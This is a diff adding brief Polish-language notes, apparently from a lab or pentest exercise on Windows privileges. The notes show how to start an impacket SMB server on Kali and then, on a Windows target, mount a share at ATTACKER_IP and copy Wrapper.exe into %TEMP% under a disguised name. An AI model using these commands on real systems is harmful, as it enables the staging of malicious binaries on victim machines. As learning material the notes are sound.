@@ -1,0 +1,15 @@
+Uruchamiamy server na kalim:
+sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
+
+
+
+Na windowsie 
+1) Podlaczamy zasow:
+   1- net use \\ATTACKER_IP\share /USER:user s3cureP@ssword 
+2) Kopiujemy pliki
+   1- copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
+3) Odlaczamy zasob
+   1- net use \\ATTACKER_IP\share /del
+
+
+Tutaj takie cos bylo robione(Uprawnienia windows)
